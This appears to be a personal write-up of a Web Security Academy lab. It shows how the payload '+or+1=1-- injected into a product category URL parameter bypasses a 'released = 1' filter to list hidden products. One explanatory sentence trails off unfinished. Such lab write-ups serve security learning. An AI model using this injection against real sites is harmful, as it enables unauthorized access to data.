# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### SQL injection -> in product category filter

### provided SQL query 
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### To solve: perform a SQL injection attack that causes the application to display all unreleased products


### given website: https://0a0c00510463539f8262e499001e0025.web-security-academy.net/

## Solution
- On clicking on any product
https://0a0c00510463539f8262e499001e0025.web-security-academy.net/product?productId=15

- On clicking on catogory
https://0a0c00510463539f8262e499001e0025.web-security-academy.net/filter?category=Accessories

- When the URL is changed with ' then url becomes https://0a0c00510463539f8262e499001e0025.web-security-academy.net/filter?category=%27

%27 is the URL encoded form of '

- The SQL query becomes
```
SELECT * FROM products WHERE category = '' AND released = 1
```

- When visited to corporate gifts we can see url as
https://0a0c00510463539f8262e499001e0025.web-security-academy.net/filter?category=Corporate+gifts

which means there is + sign to add space between

- So, we can use space to add our own query as '+or+1=1-- to check if it works and the sql query will be
```
SELECT * FROM products WHERE category = '' OR 1=1-- AND released = 1 ```
- `--` here in the query is used to comment out the rest of the query that means the query released = 1 is commented out and the query becomes

The method of adding '+or+1=1-- worked and the lab 1 is solved


